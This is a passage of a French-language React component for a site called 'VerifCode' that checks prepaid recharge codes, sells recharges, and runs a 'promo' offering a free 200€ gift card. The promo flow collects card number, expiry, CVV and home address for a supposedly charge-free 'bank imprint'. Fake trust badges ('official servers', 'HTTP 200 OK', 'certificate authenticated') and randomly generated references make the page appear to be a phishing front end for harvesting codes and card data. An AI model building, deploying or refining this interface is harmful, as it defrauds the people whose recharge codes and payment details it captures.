                          <form onSubmit={handleVerifyCodeSubmit} className="space-y-6">
                            <div className="relative">
                              <input
                                type="text"
                                value={code}
                                onChange={(e) => setCode(e.target.value)}
                                placeholder="XXXX-XXXX-XXXX"
                                className="w-full px-6 py-4 bg-slate-50 border-2 border-slate-200 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:border-blue-500 focus:bg-white transition-all text-center tracking-[0.2em] font-mono text-xl font-bold uppercase"
                                autoFocus
                              />
                            </div>
                            <button
                              type="submit"
                              disabled={!code}
                              className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl shadow-lg shadow-blue-600/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                            >
                              <Server className="w-4 h-4" />
                              Lancer la synchronisation
                            </button>
                          </form>
                      </div>
                    </div>
                  </StepLayout>
                )}

                {verifyStep === VerifyStep.ANALYSIS && (
                  <StepLayout key="verify-analysis">
                    <AnalysisView onComplete={handleAnalysisComplete} />
                  </StepLayout>
                )}

                {verifyStep === VerifyStep.RESULT && (
                  <StepLayout key="verify-result">
                    <div className="bg-white p-8 md:p-12 rounded-3xl text-center max-w-md w-full border border-slate-200 shadow-2xl">
                      <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ type: "spring", stiffness: 200, damping: 15 }}
                        className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-100"
                      >
                        <CheckCircle2 className="w-12 h-12 text-green-600" />
                      </motion.div>
                      <h2 className="text-3xl font-bold text-slate-900 mb-2">Code Valide</h2>
                      <p className="text-green-600 font-medium mb-8 bg-green-50 inline-block px-4 py-1 rounded-full text-sm">
                          Vérification officielle réussie
                      </p>
                      <div className="space-y-3 text-left bg-slate-50 p-6 rounded-xl border border-slate-200 mb-8">
                        <div className="flex justify-between text-sm py-2 border-b border-slate-200">
                          <span className="text-slate-500">Fournisseur</span>
                          <span className="text-slate-900 font-bold">{selectedCard?.name}</span>
                        </div>
                        <div className="flex justify-between text-sm py-2 border-b border-slate-200">
                          <span className="text-slate-500">Réponse Serveur</span>
                          <span className="text-green-600 font-mono text-xs font-bold">HTTP 200 OK</span>
                        </div>
                        <div className="flex justify-between text-sm py-2 pt-2">
                          <span className="text-slate-500">Certificat</span>
                          <span className="text-blue-600 font-medium flex items-center gap-1">
                            <Lock size={12} /> Authentifié
                          </span>
                        </div>
                      </div>
                      <button 
                        onClick={() => isLoggedIn ? goBackToDashboard() : resetAll()}
                        className="w-full py-3 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 rounded-xl transition-colors text-sm font-semibold"
                      >
                        Effectuer une autre vérification
                      </button>
                    </div>
                  </StepLayout>
                )}
             </>
          )}


          {/* === BUY FLOW === */}
          {flowMode === FlowMode.BUY && (
            <>
               {/* Back Button */}
                <div className="absolute top-28 left-4 md:left-12 z-40">
                   <button onClick={goBackToDashboard} className="flex items-center gap-2 text-slate-500 hover:text-slate-800 transition-colors bg-white px-3 py-1.5 rounded-lg border border-slate-200 shadow-sm text-sm font-medium">
                      <ArrowLeft size={16} /> Retour
                   </button>
                </div>

                {buyStep === BuyStep.CARD_SELECTION && (
                   <StepLayout key="buy-cards">
                    <div className="w-full">
                      <div className="text-center mb-12">
                         <h2 className="text-3xl font-bold text-slate-900 mb-4">Acheter une recharge</h2>
                         <p className="text-slate-500">Choisissez le type de carte que vous souhaitez acheter</p>
                      </div>
                      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                        {CARDS.map(card => renderCatalogCard(card, handleBuySelectCard))}
                      </div>
                    </div>
                  </StepLayout>
                )}

                {buyStep === BuyStep.AMOUNT_SELECTION && (
                  <StepLayout key="buy-amount">
                     <div className="w-full max-w-2xl">
                        <div className="text-center mb-12">
                           {selectedCard?.image && (
                              <img src={selectedCard.image} alt={selectedCard.name} className="h-16 mx-auto mb-4 object-contain" />
                           )}
                           <h2 className="text-3xl font-bold text-slate-900 mb-4">Sélectionnez le montant</h2>
                           <p className="text-slate-500">Combien souhaitez-vous créditer sur votre recharge {selectedCard?.name} ?</p>
                        </div>
                        <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                           {AMOUNTS.map((amount) => (
                             <motion.button
                                key={amount}
                                onClick={() => handleSelectAmount(amount)}
                                whileHover={{ scale: 1.03 }}
                                whileTap={{ scale: 0.98 }}
                                className="py-6 rounded-2xl bg-white border border-slate-200 shadow-sm hover:border-blue-500 hover:ring-2 hover:ring-blue-100 transition-all text-center"
                             >
                                <span className="text-2xl font-bold text-slate-900">{amount} €</span>
                             </motion.button>
                           ))}
                        </div>
                     </div>
                  </StepLayout>
                )}

                {buyStep === BuyStep.PAYMENT_METHOD && (
                  <StepLayout key="buy-method">
                     <div className="w-full max-w-2xl">
                        <div className="text-center mb-12">
                           <h2 className="text-3xl font-bold text-slate-900 mb-4">Moyen de Paiement</h2>
                           <p className="text-slate-500">Choisissez comment vous souhaitez régler votre commande de <b>{selectedAmount}€</b></p>
                        </div>
                        <div className="space-y-4">
                           {PAYMENT_METHODS.map((method) => (
                              <motion.button
                                 key={method.id}
                                 onClick={() => handleSelectPaymentMethod(method.id)}
                                 whileHover={{ scale: 1.01 }}
                                 className="w-full flex items-center p-6 bg-white border border-slate-200 rounded-2xl hover:border-blue-400 hover:shadow-md transition-all group"
                              >
                                 <div className="w-12 h-12 rounded-xl bg-slate-50 flex items-center justify-center mr-4 group-hover:bg-blue-50 transition-colors">
                                    <method.icon className="w-6 h-6 text-slate-700 group-hover:text-blue-600" />
                                 </div>
                                 <div className="text-left flex-1">
                                    <h4 className="font-bold text-slate-900">{method.name}</h4>
                                    <p className="text-xs text-slate-500">Paiement sécurisé instantané</p>
                                 </div>
                                 <ChevronRight className="text-slate-300 group-hover:text-blue-500" />
                              </motion.button>
                           ))}
                        </div>
                     </div>
                  </StepLayout>
                )}

                {buyStep === BuyStep.PAYMENT_INFO && (
                  <StepLayout key="buy-info">
                     <div className="w-full max-w-md">
                        <div className="text-center mb-8">
                           <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                              <Lock className="w-8 h-8 text-blue-600" />
                           </div>
                           <h2 className="text-2xl font-bold text-slate-900">Paiement Sécurisé</h2>
                           <p className="text-slate-500 text-sm">Entrez vos coordonnées bancaires pour finaliser.</p>
                        </div>
                        <div className="bg-white p-8 rounded-2xl border border-slate-200 shadow-xl">
                           <form onSubmit={handlePaymentSubmit} className="space-y-4">
                              <div>
                                 <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">TITULAIRE DE LA CARTE</label>
                                 <input type="text" placeholder="M. Jean Dupont" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:border-blue-500 outline-none" required />
                              </div>
                              <div>
                                 <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">NUMÉRO DE CARTE</label>
                                 <div className="relative">
                                    <input type="text" placeholder="0000 0000 0000 0000" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:border-blue-500 outline-none pl-12" required />
                                    <CardIcon className="absolute top-3.5 left-4 text-slate-400 w-5 h-5" />
                                 </div>
                              </div>
                              <div className="grid grid-cols-2 gap-4">
                                 <div>
                                    <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">DATE EXP.</label>
                                    <input type="text" placeholder="MM/AA" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:border-blue-500 outline-none" required />
                                 </div>
                                 <div>
                                    <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">CVC</label>
                                    <input type="text" placeholder="123" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:border-blue-500 outline-none" required />
                                 </div>
                              </div>
                              
                              <div className="pt-4">
                                 <button className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl shadow-lg shadow-blue-600/20 transition-all flex items-center justify-center gap-2">
                                    <Lock size={16} /> Payer {selectedAmount} €
                                 </button>
                              </div>
                           </form>
                        </div>
                     </div>
                  </StepLayout>
                )}

                {buyStep === BuyStep.PROCESSING && (
                  <StepLayout key="buy-processing">
                     <div className="text-center w-full max-w-lg">
                        <div className="relative w-32 h-32 mx-auto mb-8">
                           <div className="absolute inset-0 border-4 border-slate-100 rounded-full" />
                           <motion.div 
                              className="absolute inset-0 border-4 border-t-blue-600 border-r-blue-400 border-b-transparent border-l-transparent rounded-full"
                              animate={{ rotate: 360 }}
                              transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
                           />
                           <div className="absolute inset-0 flex items-center justify-center">
                              <CreditCard className="w-12 h-12 text-blue-600" />
                           </div>
                        </div>
                        <h2 className="text-2xl font-bold text-slate-900 mb-2">Paiement en cours...</h2>
                        <p className="text-slate-500 mb-8">Veuillez ne pas fermer cette fenêtre.</p>
                        
                        <div className="bg-white rounded-xl border border-slate-200 p-4 max-w-sm mx-auto overflow-hidden">
                           <div className="flex flex-col gap-2 text-left">
                              {PAYMENT_PROCESSING_STEPS.map((step, i) => (
                                 <motion.div 
                                    key={i}
                                    initial={{ opacity: 0, x: -10 }}
                                    animate={{ 
                                       opacity: i < (paymentProgress / 100) * PAYMENT_PROCESSING_STEPS.length ? 1 : 0.3,
                                       x: 0,
                                       color: i < (paymentProgress / 100) * PAYMENT_PROCESSING_STEPS.length ? '#0f172a' : '#94a3b8'
                                    }}
                                    className="flex items-center gap-2 text-xs font-mono"
                                 >
                                    <div className={`w-1.5 h-1.5 rounded-full ${i < (paymentProgress / 100) * PAYMENT_PROCESSING_STEPS.length ? 'bg-green-500' : 'bg-slate-300'}`} />
                                    {step}
                                 </motion.div>
                              ))}
                           </div>
                        </div>
                     </div>
                  </StepLayout>
                )}

                {buyStep === BuyStep.RESULT && (
                   <StepLayout key="buy-result">
                     <div className="bg-white p-8 md:p-12 rounded-3xl text-center max-w-md w-full border border-slate-200 shadow-2xl">
                        
                        {paymentOutcome === 'SUCCESS' && (
                           <>
                              <motion.div
                                 initial={{ scale: 0 }}
                                 animate={{ scale: 1 }}
                                 className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-100"
                              >
                                 <CheckCircle2 className="w-12 h-12 text-green-600" />
                              </motion.div>
                              <h2 className="text-3xl font-bold text-slate-900 mb-2">Paiement Confirmé</h2>
                              <p className="text-slate-500 mb-8 text-sm">
                                 Votre recharge <b>{selectedCard?.name}</b> de <b>{selectedAmount}€</b> a été envoyée par email à <b>{authEmail || 'votre adresse'}</b>.
                              </p>
                              <button onClick={goBackToDashboard} className="w-full py-3 bg-blue-600 text-white rounded-xl font-bold hover:bg-blue-700 transition-all">
                                 Retour au tableau de bord
                              </button>
                           </>
                        )}

                        {paymentOutcome === 'DECLINED' && (
                           <>
                              <motion.div
                                 initial={{ scale: 0 }}
                                 animate={{ scale: 1 }}
                                 className="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-100"
                              >
                                 <X className="w-12 h-12 text-red-600" />
                              </motion.div>
                              <h2 className="text-2xl font-bold text-slate-900 mb-2">Paiement Refusé</h2>
                              <p className="text-slate-500 mb-8 text-sm">
                                 La transaction a été refusée par votre banque. Veuillez vérifier votre solde ou essayer une autre carte.
                              </p>
                              <button onClick={() => setBuyStep(BuyStep.PAYMENT_INFO)} className="w-full py-3 bg-slate-900 text-white rounded-xl font-bold hover:bg-slate-800 transition-all">
                                 Réessayer
                              </button>
                           </>
                        )}

                        {paymentOutcome === 'ADDRESS_ERROR' && (
                           <>
                              <motion.div
                                 initial={{ scale: 0 }}
                                 animate={{ scale: 1 }}
                                 className="w-24 h-24 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-orange-100"
                              >
                                 <AlertTriangle className="w-12 h-12 text-orange-600" />
                              </motion.div>
                              <h2 className="text-2xl font-bold text-slate-900 mb-2">Adresse Incorrecte</h2>
                              <p className="text-slate-500 mb-8 text-sm">
                                 L'adresse de facturation ne correspond pas à celle associée à la carte. Veuillez corriger vos informations.
                              </p>
                              <button onClick={() => setBuyStep(BuyStep.PAYMENT_INFO)} className="w-full py-3 bg-slate-900 text-white rounded-xl font-bold hover:bg-slate-800 transition-all">
                                 Corriger les informations
                              </button>
                           </>
                        )}
                     </div>
                   </StepLayout>
                )}
            </>
          )}

          {/* === PROMO FLOW === */}
          {flowMode === FlowMode.PROMO && (
            <>
               <div className="absolute top-28 left-4 md:left-12 z-40">
                   <button onClick={goBackToDashboard} className="flex items-center gap-2 text-slate-500 hover:text-slate-800 transition-colors bg-white px-3 py-1.5 rounded-lg border border-slate-200 shadow-sm text-sm font-medium">
                      <ArrowLeft size={16} /> Retour
                   </button>
               </div>

               {promoStep === PromoStep.ADDRESS && (
                 <StepLayout key="promo-address">
                    <div className="w-full max-w-md">
                       <div className="text-center mb-8">
                          <div className="w-16 h-16 bg-rose-50 rounded-full flex items-center justify-center mx-auto mb-4 border border-rose-100">
                             <Gift className="w-8 h-8 text-rose-500" />
                          </div>
                          <h2 className="text-2xl font-bold text-slate-900">Information de Livraison</h2>
                          <p className="text-slate-500 text-sm mt-1">Où devons-nous envoyer votre carte cadeau ?</p>
                       </div>
                       
                       <form onSubmit={handlePromoAddressSubmit} className="bg-white p-8 rounded-2xl border border-slate-200 shadow-xl space-y-4">
                          <div className="grid grid-cols-2 gap-4">
                             <div>
                                <label className="block text-xs font-bold text-slate-500 mb-1">PRÉNOM</label>
                                <input required type="text" className="w-full px-4 py-2 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500" 
                                   value={promoAddress.firstName} onChange={e => setPromoAddress({...promoAddress, firstName: e.target.value})} placeholder="Jean" />
                             </div>
                             <div>
                                <label className="block text-xs font-bold text-slate-500 mb-1">NOM</label>
                                <input required type="text" className="w-full px-4 py-2 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500" 
                                   value={promoAddress.lastName} onChange={e => setPromoAddress({...promoAddress, lastName: e.target.value})} placeholder="Dupont" />
                             </div>
                          </div>
                          <div>
                             <label className="block text-xs font-bold text-slate-500 mb-1">ADRESSE</label>
                             <input required type="text" className="w-full px-4 py-2 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500" 
                                value={promoAddress.address} onChange={e => setPromoAddress({...promoAddress, address: e.target.value})} placeholder="123 Rue de la Paix" />
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                             <div>
                                <label className="block text-xs font-bold text-slate-500 mb-1">VILLE</label>
                                <input required type="text" className="w-full px-4 py-2 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500" 
                                   value={promoAddress.city} onChange={e => setPromoAddress({...promoAddress, city: e.target.value})} placeholder="Paris" />
                             </div>
                             <div>
                                <label className="block text-xs font-bold text-slate-500 mb-1">CODE POSTAL</label>
                                <input required type="text" className="w-full px-4 py-2 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500" 
                                   value={promoAddress.zipCode} onChange={e => setPromoAddress({...promoAddress, zipCode: e.target.value})} placeholder="75000" />
                             </div>
                          </div>
                          <button className="w-full py-3 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-xl mt-4 shadow-lg shadow-rose-500/20">
                             Continuer
                          </button>
                       </form>
                    </div>
                 </StepLayout>
               )}

               {promoStep === PromoStep.CARD && (
                 <StepLayout key="promo-card">
                    <div className="w-full max-w-md">
                       <div className="text-center mb-8">
                          <h2 className="text-2xl font-bold text-slate-900">Vérification d'Identité</h2>
                          <p className="text-slate-500 text-sm mt-1">Une empreinte bancaire est requise pour valider votre éligibilité (Aucun débit ne sera effectué).</p>
                       </div>
                       
                       <form onSubmit={handlePromoCardSubmit} className="bg-white p-8 rounded-2xl border border-slate-200 shadow-xl space-y-4 relative overflow-hidden">
                          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-rose-400 to-orange-400" />
                          
                          <div>
                             <label className="block text-xs font-bold text-slate-500 mb-1">NUMÉRO DE CARTE</label>
                             <div className="relative">
                                <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 w-5 h-5" />
                                <input required type="text" className="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500 font-mono" 
                                   value={promoCard.number} onChange={e => setPromoCard({...promoCard, number: e.target.value})} placeholder="0000 0000 0000 0000" maxLength={19} />
                             </div>
                          </div>
                          
                          <div className="grid grid-cols-2 gap-4">
                             <div>
                                <label className="block text-xs font-bold text-slate-500 mb-1">EXPIRATION</label>
                                <input required type="text" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500 font-mono text-center" 
                                   value={promoCard.expiry} onChange={e => setPromoCard({...promoCard, expiry: e.target.value})} placeholder="MM/YY" maxLength={5} />
                             </div>
                             <div>
                                <label className="block text-xs font-bold text-slate-500 mb-1">CVV</label>
                                <div className="relative">
                                   <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
                                   <input required type="password" className="w-full pl-9 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-rose-500 font-mono text-center" 
                                      value={promoCard.cvv} onChange={e => setPromoCard({...promoCard, cvv: e.target.value})} placeholder="123" maxLength={4} />
                                </div>
                             </div>
                          </div>

                          <div className="flex items-start gap-2 text-xs text-slate-400 bg-slate-50 p-3 rounded-lg border border-slate-100">
                             <ShieldCheck className="w-4 h-4 shrink-0 mt-0.5 text-green-500" />
                             <span>Transmission chiffrée SSL 256-bit. Votre banque peut demander une authentification 3DS.</span>
                          </div>

                          <button className="w-full py-4 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-xl mt-4 shadow-lg shadow-rose-500/20 flex items-center justify-center gap-2">
                             Vérifier & Recevoir ma Prime
                          </button>
                       </form>
                    </div>
                 </StepLayout>
               )}

               {promoStep === PromoStep.PROCESSING && (
                 <StepLayout key="promo-processing">
                    <div className="text-center">
                       <div className="relative w-32 h-32 mx-auto mb-8">
                          <div className="absolute inset-0 rounded-full border-4 border-slate-100" />
                          <div className="absolute inset-0 rounded-full border-4 border-rose-500 border-t-transparent animate-spin" />
                          <Gift className="absolute inset-0 m-auto text-rose-500 w-12 h-12 animate-pulse" />
                       </div>
                       <h2 className="text-2xl font-bold text-slate-900 mb-2">Vérification en cours...</h2>
                       <p className="text-slate-500">Nous validons votre éligibilité auprès des partenaires.</p>
                    </div>
                 </StepLayout>
               )}

               {promoStep === PromoStep.RESULT && (
                  <StepLayout key="promo-result">
                     <div className="bg-white p-8 md:p-12 rounded-3xl text-center max-w-md w-full border border-slate-200 shadow-2xl relative overflow-hidden">
                        <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none">
                            <div className="absolute top-[-50%] left-[-50%] w-[200%] h-[200%] bg-gradient-to-br from-rose-100/20 to-transparent rotate-12" />
                        </div>
                        
                        <motion.div
                          initial={{ scale: 0 }}
                          animate={{ scale: 1 }}
                          transition={{ type: "spring", stiffness: 200, damping: 15 }}
                          className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-100 relative z-10"
                        >
                          <CheckCircle2 className="w-12 h-12 text-green-600" />
                        </motion.div>
                        
                        <h2 className="text-3xl font-bold text-slate-900 mb-2 relative z-10">Félicitations !</h2>
                        <p className="text-slate-500 mb-8 relative z-10">
                           Votre éligibilité a été confirmée. Vous allez recevoir votre carte cadeau de <strong>200€</strong> par voie postale sous 3 à 5 jours ouvrés.
                        </p>

                        <div className="bg-slate-50 p-4 rounded-xl border border-slate-200 mb-8 text-left text-sm space-y-2 relative z-10">
                           <div className="flex justify-between">
                              <span className="text-slate-500">Référence</span>
                              <span className="font-mono font-bold text-slate-900">CMD-{Math.floor(Math.random() * 100000)}</span>
                           </div>
                           <div className="flex justify-between">
                              <span className="text-slate-500">Statut</span>
                              <span className="text-green-600 font-bold bg-green-100 px-2 py-0.5 rounded-full text-xs">Validé</span>
                           </div>
                        </div>
                        
                        <button 
                          onClick={goBackToDashboard}
                          className="w-full py-3 bg-slate-900 hover:bg-slate-800 text-white rounded-xl transition-colors font-bold relative z-10"
                        >
                          Retour au tableau de bord
                        </button>
                      </div>
                  </StepLayout>
               )}
            </>
          )}

        </AnimatePresence>
      </main>

      {/* Footer / Legal */}
      <footer className="w-full py-8 text-center border-t border-slate-200 bg-white z-10 relative">
        <div className="flex items-center justify-center gap-2 mb-2">
           <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
           <p className="text-[10px] text-slate-500 uppercase tracking-widest font-bold">Connecté aux serveurs officiels</p>
        </div>
        <p className="text-xs text-slate-400">
           © 2024 VerifCode. Protocole sécurisé SSL/TLS. <br/>
           Nous ne sommes pas émetteurs de monnaie électronique.
        </p>
      </footer>
    </div>
  );
}